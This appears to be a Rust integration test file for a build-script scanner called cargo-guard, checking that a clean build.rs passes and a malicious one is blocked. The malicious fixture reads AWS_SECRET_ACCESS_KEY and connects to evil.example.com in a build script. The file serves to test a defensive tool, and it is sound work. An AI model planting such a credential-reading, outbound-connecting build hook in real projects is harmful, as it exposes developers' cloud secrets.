use std::fs;
use std::process::Command;
use tempfile::tempdir;

#[test]
fn test_cargo_guard_scan_clean_project() {
    let dir = tempdir().expect("failed to create temp dir");
    let build_rs_path = dir.path().join("build.rs");
    fs::write(
        &build_rs_path,
        r#"
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
"#,
    )
    .expect("failed to write build.rs");

    let status = Command::new(env!("CARGO_BIN_EXE_cargo-guard"))
        .arg("scan")
        .arg(dir.path())
        .status();

    assert!(status.is_ok());
    assert!(status.unwrap().success());
}

#[test]
fn test_cargo_guard_scan_malicious_project_blocks() {
    let dir = tempdir().expect("failed to create temp dir");
    let build_rs_path = dir.path().join("build.rs");
    fs::write(
        &build_rs_path,
        r#"
use std::env;
use std::net::TcpStream;

fn main() {
    let _token = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    let _ = TcpStream::connect("evil.example.com:443");
}
"#,
    )
    .expect("failed to write malicious build.rs");

    let status = Command::new(env!("CARGO_BIN_EXE_cargo-guard"))
        .arg("scan")
        .arg(dir.path())
        .status();

    assert!(status.is_ok());
    assert!(!status.unwrap().success());
}
